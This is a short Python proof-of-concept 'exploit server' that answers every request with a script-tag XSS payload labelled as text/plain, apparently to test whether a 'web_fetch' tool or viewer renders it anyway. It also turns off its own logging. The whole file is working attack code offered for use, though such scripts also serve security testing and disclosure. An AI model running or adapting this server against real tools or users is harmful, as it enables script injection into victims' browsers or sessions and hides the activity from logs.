# exploit_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve malicious HTML as text/plain
        malicious_payload = '<script>alert("XSS via web_fetch: " + document.location)</script>'
        
        self.send_response(200)
        # Critical: Set content-type to text/plain (not text/html)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(malicious_payload.encode())
    
    def log_message(self, format, *args):
        pass  # Suppress logs
 
if __name__ == '__main__':
    httpd = HTTPServer(('0.0.0.0', 8080), Handler)
    print("Exploit server running on http://0.0.0.0:8080")
    httpd.serve_forever()
